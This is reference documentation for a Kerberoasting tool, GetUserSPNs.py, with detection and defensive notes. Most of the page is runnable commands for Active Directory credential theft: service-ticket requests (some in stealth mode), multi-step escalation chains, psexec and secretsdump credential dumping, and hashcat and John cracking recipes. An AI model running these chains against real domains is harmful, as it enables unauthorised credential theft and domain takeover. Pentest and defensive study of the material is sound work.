# GetUserSPNs.py

## Overview
`GetUserSPNs.py` implements the Kerberoasting attack, which targets service accounts with Service Principal Names (SPNs) registered in Active Directory. This attack allows extraction of service ticket hashes that can be cracked offline to recover service account passwords.

## Detailed Description
Kerberoasting exploits the way Kerberos handles service authentication. When a user requests access to a service, they receive a service ticket encrypted with the service account's password hash. Since service accounts often have weak passwords and high privileges, this attack is highly effective for privilege escalation.

### Key Features:
- Enumerate users with SPNs registered
- Request service tickets (TGS-REP) for offline cracking
- Support for targeted and automated SPN discovery
- Multiple output formats (John, Hashcat)
- Stealth options to avoid detection
- Support for various authentication methods

### Technical Details:
- Exploits TGS-REQ/TGS-REP exchange in Kerberos
- Targets accounts with ServicePrincipalName attribute
- Service tickets encrypted with service account password
- Uses RC4-HMAC or AES encryption (RC4 preferred for cracking)

## Command Line Options

```
usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE]
                      [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE]
                      [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                      [-dc-ip ip] [-dc-host hostname] [-stealth]
                      target

Required Arguments:
  target                Domain/username[:password]

Optional Arguments:
  -target-domain        Target domain (if different from user domain)
  -usersfile            File with user per line to test
  -request              Request TGS for users with SPNs
  -request-user         Request TGS for specific user
  -save                 Save TGS to ccache file
  -outputfile           Output file for hashes
  -debug                Enable debug output
  -stealth              Perform stealth enumeration

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -dc-ip                Domain controller IP address
  -dc-host              Domain controller hostname
```

## Usage Examples

### Basic Kerberoasting
```bash
# Enumerate all SPNs and request tickets
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Target specific user with SPN
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request-user service_account

# Save output to file
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request -outputfile spn_hashes.txt
```

### Stealth Enumeration
```bash
# Perform stealth enumeration (slower but less detectable)
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -stealth -request

# Just enumerate SPNs without requesting tickets
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10
```

### Using Different Authentication Methods
```bash
# Use NTLM hash authentication
python3 GetUserSPNs.py domain.com/user -hashes :ntlmhash -dc-ip 192.168.1.10 -request

# Use Kerberos authentication
python3 GetUserSPNs.py domain.com/user -k -dc-ip 192.168.1.10 -request

# Use AES key for Kerberos
python3 GetUserSPNs.py domain.com/user -aesKey aes_key -k -dc-ip 192.168.1.10 -request
```

### Targeted Attacks
```bash
# Use custom user list
python3 GetUserSPNs.py domain.com/user:password -usersfile service_accounts.txt -dc-ip 192.168.1.10 -request

# Save tickets to ccache files
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request -save
```

## Attack Chain Integration

### Initial Domain Reconnaissance
```bash
# Step 1: Perform basic domain enumeration
python3 GetADUsers.py domain.com/user:password -dc-ip 192.168.1.10 -all

# Step 2: Check for ASREPRoastable users
python3 GetNPUsers.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Step 3: Perform Kerberoasting
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request

# Step 4: Crack obtained hashes
hashcat -m 13100 spn_hashes.txt wordlist.txt
```

### Privilege Escalation Chain
```bash
# Step 1: Gain low-privileged access
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request

# Step 2: Crack hash and get valid credentials  
hashcat -m 18200 asrep.hash wordlist.txt

# Step 3: Use credentials for Kerberoasting
python3 GetUserSPNs.py domain.com/cracked_user:password -dc-ip 192.168.1.10 -request

# Step 4: Crack service account password
hashcat -m 13100 service_tickets.txt wordlist.txt

# Step 5: Use service account for further attacks
python3 secretsdump.py domain.com/service_account:password@dc.domain.com
```

### Post-Exploitation Enhancement
```bash
# Step 1: Access compromised system
python3 psexec.py domain.com/user:password@target.domain.com

# Step 2: Extract cached credentials
python3 secretsdump.py domain.com/user:password@target.domain.com

# Step 3: Use extracted credentials for Kerberoasting
python3 GetUserSPNs.py domain.com/extracted_user:password -dc-ip 192.168.1.10 -request
```

## Hash Cracking

### Hashcat Usage
```bash
# Crack Kerberos 5 TGS-REP hashes (RC4-HMAC)
hashcat -m 13100 spn_hashes.txt wordlist.txt

# Crack AES-encrypted tickets
hashcat -m 19600 aes_hashes.txt wordlist.txt  # AES128
hashcat -m 19700 aes_hashes.txt wordlist.txt  # AES256

# Use rules for better success rate
hashcat -m 13100 spn_hashes.txt wordlist.txt -r rules/best64.rule

# Brute force attack
hashcat -m 13100 spn_hashes.txt -a 3 ?u?l?l?l?l?l?d?d
```

### John the Ripper Usage
```bash
# Crack with John the Ripper
john --wordlist=wordlist.txt spn_hashes.txt

# Show cracked passwords
john --show spn_hashes.txt

# Use specific format
john --format=krb5tgs spn_hashes.txt --wordlist=wordlist.txt
```

## Target Identification

### Finding Kerberoastable Accounts
```powershell
# PowerShell to find users with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```bash
# LDAP search for users with SPNs
ldapsearch -H ldap://dc.domain.com -D "user@domain.com" -w password \
  -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" samaccountname servicePrincipalName
```

### Common Service Account Patterns
- SQL Server service accounts (MSSQL*)
- Exchange service accounts  
- SharePoint service accounts
- Custom application service accounts
- IIS application pool accounts

## Prerequisites
- Valid domain credentials (any domain user)
- Network access to domain controller
- Target domain with service accounts having SPNs
- Knowledge of domain name and structure

## Detection Considerations
- **Event ID 4769**: Kerberos service ticket was requested
- **Unusual TGS Requests**: Multiple TGS requests for different services
- **RC4 Downgrade**: Requests specifically for RC4 encryption
- **Service Account Patterns**: TGS requests for service accounts
- **Volume Indicators**: High number of ticket requests in short time

## Defensive Measures
- **Strong Service Account Passwords**: Use complex, long passwords for service accounts
- **Managed Service Accounts**: Use Group Managed Service Accounts (gMSA)
- **AES Encryption**: Force AES encryption for Kerberos (disable RC4)
- **Monitoring**: Implement monitoring for unusual TGS request patterns
- **Least Privilege**: Limit service account privileges
- **Regular Rotation**: Rotate service account passwords regularly
- **Honeypots**: Create decoy service accounts to detect attacks

## Advanced Techniques

### SPN Enumeration without Authentication
```bash
# Use anonymous LDAP bind (if allowed)
python3 GetUserSPNs.py domain.com/ -dc-ip 192.168.1.10

# Use guest account
python3 GetUserSPNs.py domain.com/guest: -dc-ip 192.168.1.10
```

### Roasting Specific Services
```bash
# Target only SQL Server services
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request | grep -i mssql

# Target specific SPN
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request-user sqlservice
```

## Common Errors and Troubleshooting

### Clock Skew Issues
```bash
# Synchronize time with domain controller
sudo ntpdate dc.domain.com
```

### Encryption Type Issues
```bash
# Force RC4 encryption (weaker but easier to crack)
# This is usually automatic but may need registry changes on newer systems
```

### No SPNs Found
```bash
# Verify domain connectivity
python3 GetADUsers.py domain.com/user:password -dc-ip 192.168.1.10

# Check if user has appropriate permissions
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -debug
```

## Related Tools
- [GetNPUsers.py](GetNPUsers.md) - ASREPRoasting (complementary attack)
- [GetADUsers.py](GetADUsers.md) - User enumeration for target identification
- [getST.py](getST.md) - Request specific service tickets
- [ticketer.py](ticketer.md) - Create tickets with compromised credentials
- [secretsdump.py](secretsdump.md) - Extract credentials after successful compromise
- [rbcd.py](rbcd.md) - Leverage compromised service accounts for RBCD attacks
